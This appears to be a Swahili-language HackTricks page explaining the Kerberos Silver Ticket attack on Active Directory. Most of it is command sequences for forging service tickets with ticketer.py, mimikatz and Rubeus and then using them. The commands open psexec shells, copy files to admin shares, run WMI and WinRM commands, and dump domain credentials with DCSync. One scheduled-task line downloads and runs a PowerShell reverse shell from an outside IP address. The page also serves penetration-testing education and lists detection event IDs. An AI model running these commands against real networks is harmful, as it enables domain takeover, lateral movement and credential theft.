# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Shambulio la **Silver Ticket** linahusisha unyakuzi wa tiketi za huduma katika mazingira ya Active Directory (AD). Njia hii inategemea **kupata NTLM hash ya akaunti ya huduma**, kama akaunti ya kompyuta, ili kuunda tiketi ya Ticket Granting Service (TGS). Kwa tiketi hii iliyoundwa, mshambuliaji anaweza kufikia huduma maalum kwenye mtandao, **akijifanya kuwa mtumiaji yeyote**, kwa kawaida akilenga mamlaka ya usimamizi. Inasisitizwa kwamba kutumia funguo za AES kwa ajili ya kuunda tiketi ni salama zaidi na si rahisi kugundulika.

Kwa ajili ya kuunda tiketi, zana tofauti zinatumika kulingana na mfumo wa uendeshaji:

### On Linux
```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Kwenye Windows
```bash
# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Huduma ya CIFS inasisitizwa kama lengo la kawaida kwa kupata mfumo wa faili wa mwathirika, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumika kwa kazi na maswali ya WMI.

## Huduma Zinazopatikana

| Aina ya Huduma                             | Tiketi za Fedha za Huduma za Silver                                       |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika matukio mengine unaweza tu kuuliza: WINRM</p> |
| Kazi za Ratiba                            | HOST                                                                       |
| Kushiriki Faili za Windows, pia psexec    | CIFS                                                                       |
| Operesheni za LDAP, ikiwa ni pamoja na DCSync | LDAP                                                                       |
| Zana za Usimamizi wa Server ya Mbali ya Windows | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Tiketi za Dhahabu                          | krbtgt                                                                     |

Kwa kutumia **Rubeus** unaweza **kuomba zote** tiketi hizi kwa kutumia parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Vitambulisho vya Tukio la Tiketi za Silver

- 4624: Kuingia kwa Akaunti
- 4634: Kutoka kwa Akaunti
- 4672: Kuingia kwa Admin

## Kutumia Tiketi za Huduma

Katika mifano ifuatayo hebu tuwaze kwamba tiketi inapatikana kwa kujifanya kuwa akaunti ya msimamizi.

### CIFS

Kwa tiketi hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimewekwa wazi) na nakala za faili sehemu ya mfumo wa faili wa mbali kwa kufanya kitu kama:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Utapata pia uwezo wa kupata shell ndani ya mwenyeji au kutekeleza amri zisizo na mpangilio ukitumia **psexec**:

{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### MWEZI

Kwa ruhusa hii unaweza kuunda kazi zilizopangwa katika kompyuta za mbali na kutekeleza amri zisizo na mpangilio:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Kwa tiketi hizi unaweza **kutekeleza WMI katika mfumo wa mwathirika**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pata **maelezo zaidi kuhusu wmiexec** katika ukurasa ufuatao:

{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Kwa ufikiaji wa winrm juu ya kompyuta unaweza **kuipata** na hata kupata PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Angalia ukurasa ufuatao kujifunza **njia zaidi za kuungana na mwenyeji wa mbali kwa kutumia winrm**:

{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Kumbuka kwamba **winrm lazima iwe hai na inasikiliza** kwenye kompyuta ya mbali ili kuweza kuipata.

### LDAP

Kwa ruhusa hii unaweza kutupa database ya DC kwa kutumia **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Jifunze zaidi kuhusu DCSync** katika ukurasa ufuatao:

## Marejeo

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#ref}}
dcsync.md
{{#endref}}



{{#include ../../banners/hacktricks-training.md}}
